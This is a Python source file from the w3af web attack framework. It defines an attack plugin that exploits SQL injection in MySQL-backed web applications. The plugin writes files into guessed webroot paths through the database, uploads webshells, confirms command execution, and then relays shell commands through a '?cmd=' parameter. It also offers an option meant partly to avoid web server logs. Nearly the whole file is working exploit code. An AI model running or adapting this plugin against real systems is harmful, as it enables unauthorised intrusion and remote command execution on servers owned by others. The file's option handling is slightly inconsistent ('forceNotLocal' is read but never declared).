'''
mysqlWebShell.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''

from core.data.fuzzer.fuzzer import *
import core.controllers.outputManager as om
# options
from core.data.options.option import option
from core.data.options.optionList import optionList
from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin

import core.data.kb.knowledgeBase as kb
import core.data.kb.vuln as vuln

import core.data.parsers.urlParser as urlParser
from core.controllers.w3afException import w3afException
import os
import urllib

from plugins.attack.webshells.getShell import getShell
from plugins.attack.db.dbDriverBuilder import dbDriverBuilder as dbDriverBuilder
from core.controllers.sqlTools.blindSqli import blindSqli as blindSqliTools

class mysqlWebShell(baseAttackPlugin):
    '''
    Exploits [blind] sql injections to create a webshell on the remote host.
    
    @author: Andres Riancho ( andres.riancho@gmail.com )
    '''

    def __init__(self):
        baseAttackPlugin.__init__(self)
        self._vuln = None
        
        # User configured options for fastExploit
        self._url = ''
        self._method = ''
        self._data = ''
        self._injvar = ''
        self._changeToPost = True
        self._equAlgorithm = 'stringEq'
        self._equalLimit = 0.8
        self._forceNotLocal = False
        
    def fastExploit( self ):
        '''
        Exploits a web app with [blind] sql injections vulns.
        The options are configured using the plugin options and setOptions() method.
        '''
        om.out.information( 'Starting mysqlWebShell fastExploit.' )
        v = vuln.vuln()
        v.setURL( self._url )
        v.setMethod( self._method )
        v.setDc( urlParser.getQueryString( 'http://a/a.txt?' + self._data ) )
        v.setVar( self._injvar )
    
        self._generateShell( v )
        
        return 'good'
        
    def getAttackType(self):
        return 'shell'
    
    def getExploitableVulns(self):
        vulns = kb.kb.getData( 'blindSqli' , 'blindSqli' )
        vulns.extend( kb.kb.getData( 'sqli' , 'sqli' ) )
        return vulns
        
    def canExploit( self, vulnToExploit=None ):
        '''
        Searches the kb for vulnerabilities that the plugin can exploit.

        @return: True if plugin knows how to exploit a found vuln.
        '''
        vulns = kb.kb.getData( 'blindSqli' , 'blindSqli' )
        vulns.extend( kb.kb.getData( 'sqli' , 'sqli' ) )
        if vulnToExploit != None:
            vulns = [ v for v in vulns if v.getId() == vulnToExploit ]
            
        if len(vulns) == 0:
            return False
        else:
            return True
                
    def exploit(self, vulnToExploit=None ):
        '''
        Exploits a [blind] sql injection vulns that was found and stored in the kb.

        @return: True if the shell is working and the user can start calling rexec
        '''
        om.out.information( 'mysqlWebShell exploit plugin is starting.' )
    
        if not self.canExploit():
            om.out.information( 'No [blind] sql injection vulnerabilities have been found.' )
            om.out.information( 'Hint #1: Try to find vulnerabilities using the audit plugins.' )
            om.out.information( 'Hint #2: Use the set command to enter the values yourself, and then exploit it using fastExploit.' )
        else:
            vulns = self.getExploitableVulns()
            
            # Create the blind sql handler
            self._bsql = blindSqliTools()
            self._bsql.setUrlOpener( self._urlOpener )
            self._bsql.setEqualLimit( self._equalLimit )
            self._bsql.setEquAlgorithm( self._equAlgorithm )
            
            vulns2 = []
            for v in vulns:
                vulns2.extend( self._bsql.verifyBlindSQL( v.getMutant().getFuzzableReq(), v.getVar() ) )
            vulns = vulns2
            
            for vuln in vulns:
                # Try to get a shell using all vuln
                om.out.information('Trying to exploit using vulnerability with id: ' + str( vuln.getId() ) )
                if self._generateShell(vuln):
                    # A shell was generated, I only need one point of exec.
                    om.out.information( '[Blind] sql vulnerability successfully exploited. You may start entering commands.' )
                    kb.kb.append( self, 'shell', vuln )
                    return True
                else:
                    om.out.information('Failed to exploit using vulnerability with id: ' + str( vuln.getId() ) )
        return False
                
    def _generateShell( self, vuln ):
        '''
        @parameter vuln: The vuln to exploit, as it was saved in the kb or supplied by the user with set commands.
        @return: True if mysqlWebShell could fingerprint the database.
        '''
        om.out.information('Creating database driver.')
        dbBuilder = dbDriverBuilder( self._urlOpener, self._bsql.equal )
        self._driver = dbBuilder.getDriverForVuln( vuln )
        
        if self._driver == None:
            om.out.information('Failed to create database driver.')
            return False
        else:
            # Successfully exploited [blind]sql, 
            # Lets check that the webApp connects to a database thats in "localhost"
            om.out.information('Checking if the web application and the database are in the same host.')
            currentUser = self._driver.getCurrentUser()
            if not currentUser.upper().endswith( 'LOCALHOST' ):
                om.out.information('The web application and the database seem to be in different hosts. If you want to continue this exploit anyway, set the forceNotLocal setting to True and run again.')
                if not self._forceNotLocal:
                    return False
                else:
                    om.out.information('The web application and the database seem to be in different hosts. Continuing by user request.')
            else:
                om.out.information('The database and the web application run on the same host. Continuing with the exploit.')
                
            # lets check if I can write a file to the webroot
            if not self._generateMysqlWebShell( vuln ):
                return False
            else:
                return True
            
    def _generateMysqlWebShell( self, vuln ):
        '''
        Generates a table in the remote mysql server, then saves that table to a
        file in the remote web server webroot.
        '''
        extension = vuln.getURL()[ vuln.getURL().rfind('.') +1 :]
        shellList = getShell( extension )
        filename = createRandAlpha( 7 )
        fakeContent = createRandAlpha( 7 )
        
        # Set this for later
        baseUrl = urlParser.baseUrl( vuln.getURL() )
        
        for webroot, path in self._getRemotePaths( vuln ):
            om.out.debug('Testing if mysql has privileges to create file: '+ path + filename )
            self._driver.writeFile( path + filename , fakeContent )
            
            # Now we verify if the file is there!
            outFilePath = path.replace( webroot, baseUrl )
            outFilePath += filename
            response =  self._urlOpener.GET( outFilePath )
            
            if not( response.getCode() == '200' and response.getBody() == fakeContent ):
                om.out.debug('Mysql has NO privileges to create file: '+ path +filename )
            else:
                om.out.debug('The file seems to have been created! Checking if I can execute...')
            
                # I can't be sure of the framework being used, so I upload all of them until I suceed
                for fileContent, realExtension in shellList:
                    # Upload the shell
                    self._driver.writeFile( path + filename + '.' + realExtension , fileContent )
                    
                    # Verify if I can execute commands
                    rnd = createRandAlNum(6)
                    cmd = 'echo+%22' + rnd + '%22'
                    
                    self._remoteShell = urlParser.getDomainPath( outFilePath ) + filename + '.' + realExtension + '?cmd='
                    toSend = self._remoteShell + cmd

                    response = self._urlOpener.GET( toSend )
                    
                    if response.getBody().count( rnd ):
                        om.out.debug('The uploaded shell returned what we expected: ' + rnd )
                        self._vuln = vuln
                        self._defineCut( response.getBody(), '!#!#', exact=True )
                        return True
                        
                    else:
                        om.out.debug('The uploaded shell with extension: "'+extension+'" DIDN\'T returned what we expected, it returned : ' + response.getBody() )
                
        return False
    
    def _getRemotePaths( self, vuln ):
        '''
        Get a list of possible paths where the database can write a file to the remote webroot.

        Using some path disclosure problems I can make a good guess
        of the full paths of all files in the webroot, this is the result of
        that guess.
        '''
        res = []
        pathDiscList = kb.kb.getData( 'pathDisclosure' , 'listFiles' )
        if len( pathDiscList ) == 0:
            om.out.information( 'No path disclosure vulnerabilities found. w3af will try to guess the Web Root path.' )
            res = []
            for webroot in self._getDefaultDocumentRoot( vuln ):
                res.extend(  self._generatePaths( webroot ) )
            return res
        else:
            pathDiscList = kb.kb.getData( 'pathDisclosure' , 'listPaths' )
            return pathDiscList
    
    def _generatePaths( self, webroot ):
        '''
        @return: A list of paths based on the webroot given and the paths 
        obtained during discovery phase.
        '''
        urlList = kb.kb.getData( 'urls', 'urlList' )
        paths = [ '/'.join( urlParser.getPath( x ).split('/')[:-1] )+'/' for x in urlList ]
        
        pathSep = '/'
        if webroot[0]!='/':
            pathSep = '\\'
        
        res = []
        for path in paths:
            # I need to get the path
            completePath = webroot + path.replace('/', pathSep)
            completePath = completePath.replace( pathSep+pathSep , pathSep )
            res.append( (webroot, completePath ) )
            
        return res
        
    def _getDefaultDocumentRoot( self, vuln ):
        '''
        @return: A list of common and default document roots
        '''
        res = []
        res.append('/var/www/')
        res.append('/var/www/html/')
        res.append('/var/www/htdocs/')
        res.append('/var/www/' + urlParser.getDomain( vuln.getURL() ) )
        res.append( '/home/' + urlParser.getDomain( vuln.getURL() ) )
        res.append( '/home/' + urlParser.getDomain( vuln.getURL() ) + '/www/' )
        res.append( '/home/' + urlParser.getDomain( vuln.getURL() ) + '/html/' )
        res.append( '/home/' + urlParser.getDomain( vuln.getURL() ) + '/htdocs/' )
        return res
        
    def _rexec( self, command ):
        '''
        This method is called when a command is being sent to the remote server.

        @parameter command: The command to send ( users, dbs, etc ).
        @return: The result of the command.
        '''
        toSend = self._remoteShell + '?cmd=' + urllib.quote_plus( command )
        response = self._urlOpener.GET( toSend )
        return self._cut( response.getBody() )
    
    
    def getOptions(self):
        '''
        @return: A list of option objects for this plugin.
        '''
        d1 = 'URL to exploit with fastExploit()'
        o1 = option('url', self._url, d1, 'string')
        
        d2 = 'Method to use with fastExploit()'
        o2 = option('method', self._method, d2, 'string')

        d3 = 'Data to send with fastExploit()'
        o3 = option('data', self._data, d3, 'string')

        d4 = 'Variable where to inject with fastExploit()'
        o4 = option('injvar', self._injvar, d4, 'string')

        d5 = 'The algorithm to use in the comparison of true and false response for blind sql.'
        h5 = 'The options are: "stringEq", "setIntersection" and "intelligentCut" . Read the user documentation for details.'
        o5 = option('equAlgorithm', self._equAlgorithm, d5, 'string', help=h5)

        d6 = 'Set the equal limit variable'
        h6 = 'Two pages are equal if they match in more than equalLimit. Only used when equAlgorithm is set to setIntersection.'
        o6 = option('equalLimit', self._equalLimit, d6, 'float')
        
        d7 = 'If the vulnerability was found in a GET request, try to change the method to POST during exploitation.'
        h7 = 'If the vulnerability was found in a GET request, try to change the method to POST during exploitation; this is usefull for not being logged in the webserver logs.'
        o7 = option('changeToPost', self._changeToPost, d7, 'boolean', help=h7)
        
        ol = optionList()
        ol.add(o1)
        ol.add(o2)
        ol.add(o3)
        ol.add(o4)
        ol.add(o5)
        ol.add(o6)
        ol.add(o7)
        return ol
        
    def setOptions( self, optionsMap ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of getOptions().
        
        @parameter optionsMap: A map with the options for the plugin.
        @return: No value is returned.
        '''
        self._url = urlParser.uri2url( optionsMap['url'].getValue() )
        self._method = optionsMap['method'].getValue()
        self._data = optionsMap['data'].getValue()
        self._injvar = optionsMap['injvar'].getValue()
        self._equAlgorithm = optionsMap['equAlgorithm'].getValue()
        self._equalLimit = optionsMap['equalLimit'].getValue()
        self._forceNotLocal = optionsMap['forceNotLocal'].getValue()
        self._changeToPost = optionsMap['changeToPost'].getValue()

    def getPluginDeps( self ):
        '''
        @return: A list with the names of the plugins that should be runned before the
        current one.
        '''
        return []
    
    def getRootProbability( self ):
        '''
        @return: This method returns the probability of getting a root shell using this attack plugin.
        This is used by the "exploit *" function to order the plugins and first try to exploit the more critical ones.
        This method should return 0 for an exploit that will never return a root shell, and 1 for an exploit that WILL ALWAYS
        return a root shell.
        '''
        return 0.6
        
    def getLongDesc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits two vulnerabilities and returns a shell. Two vulnerabilities must be present, a SQL injection
        and a folder permission misconfiguration that allows the database server to write a file inside the webroot; if both
        vulnerabilities are present, this plugin will write a webshell to the webroot and the user can then start typing
        commands.
        
        Six configurable parameters exist:
            - url
            - method
            - data
            - injvar
            - equAlgorithm
            - equalLimit
            - forceNotLocal
        '''
